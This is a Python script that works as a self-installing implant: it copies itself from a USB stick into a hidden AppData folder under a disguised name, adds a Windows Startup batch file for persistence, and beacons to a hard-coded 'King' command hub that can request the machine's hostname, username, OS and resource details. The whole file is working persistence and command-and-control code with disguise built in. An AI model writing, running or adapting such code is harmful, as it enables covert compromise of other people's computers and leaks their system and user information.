import os
import shutil
import sys
import argparse
import getpass
import json
import platform
import socket
import time

def establish_persistence():
    """Copies the script to the local drive and adds it to Windows Startup."""
    try:
        # 1. Define paths (Hidden in AppData)
        app_data = os.getenv('APPDATA')
        target_dir = os.path.join(app_data, 'SystemUpdates')
        target_file = os.path.join(target_dir, 'win_manager.py')

        # 2. Create the hidden folder if it doesn't exist
        if not os.path.exists(target_dir):
            os.makedirs(target_dir)

        # 3. Copy itself from USB to the Laptop's internal drive
        # sys.argv[0] is the current location of this script (e.g., the USB)
        if os.path.abspath(sys.argv[0]) != os.path.abspath(target_file):
            shutil.copy(sys.argv[0], target_file)
            print(f"[*] Payload migrated to: {target_file}")
        
        # 4. Create the Startup trigger (.bat file)
        startup_folder = os.path.join(os.getenv('USERPROFILE'), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
        bat_path = os.path.join(startup_folder, "ServiceUpdate.bat")
        
        # Only write the bat file if it doesn't exist to avoid constant overwriting
        if not os.path.exists(bat_path):
            with open(bat_path, "w") as f:
                # Use 'pythonw' if you want it to be invisible, or 'python' for testing
                f.write(f'@echo off\npython "{target_file}"')
            print("[*] Persistence established in Startup folder.")
    except Exception as e:
        print(f"[-] Persistence failed: {e}")

def get_username() -> str:
    try:
        return os.getlogin()
    except OSError:
        return getpass.getuser()

def report_status() -> str:
    info = {
        'OS': platform.system(),
        'Version': platform.version(),
        'Hostname': socket.gethostname(),
        'User': get_username(),
        'Python': platform.python_version(),
    }
    try:
        import psutil
        uptime_seconds = time.time() - psutil.boot_time()
        info['Uptime'] = f'{uptime_seconds:.2f}s'
        info['CPU'] = f'{psutil.cpu_percent(interval=0.2)}%'
        info['Memory'] = f'{psutil.virtual_memory().percent}% used'
    except ImportError:
        info['Uptime'] = 'N/A (psutil not installed)'
    return json.dumps(info)

def connect_to_hub(hub_ip: str, port: int) -> None:
    delay = 5  # Start with 5 seconds to allow Wi-Fi to connect after reboot
    while True:
        client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        client.settimeout(10.0)

        try:
            print(f"[*] Attempting to reach King at {hub_ip}...")
            client.connect((hub_ip, port))
            print(f"[*] SUCCESS: Connected to Command Hub.")
            delay = 1 # Reset delay after successful connection

            while True:
                try:
                    data = client.recv(4096).decode('utf-8', errors='ignore')
                except socket.timeout:
                    continue

                if not data:
                    print("[-] Connection closed by hub")
                    break

                for message in data.strip().splitlines():
                    command = message.strip()
                    if not command: continue

                    if command == 'STATUS_REPORT':
                        report = report_status()
                        client.sendall(f'STATUS:{report}\n'.encode('utf-8'))
                    elif command == 'SHUTDOWN_NODE':
                        print('[*] Shutdown command received.')
                        return
                    elif command == 'PING':
                        client.sendall(b'PING_OK\n')
                    else:
                        print(f'[?] Received: {command}')
        
        except socket.error as e:
            # This catches Error 11001 and others
            print(f"[-] King is offline or Wi-Fi not ready (Error {e}).")
        except Exception as exc:
            print(f'[-] Unexpected Error: {exc}')
        finally:
            try:
                client.shutdown(socket.SHUT_RDWR)
            except OSError:
                pass
            client.close()

        print(f'[*] Retrying in {delay} seconds...')
        time.sleep(delay)
        # Exponential backoff: waits longer each time it fails, up to 30s
        delay = min(delay + 5, 30)

if __name__ == '__main__':
    # Initialize Persistence FIRST
    establish_persistence()
    
    # Define Hub Details (Change the IP here to your King's IP)
    HUB_IP = '192.168.100.9' 
    HUB_PORT = 9999
    
    connect_to_hub(HUB_IP, HUB_PORT)
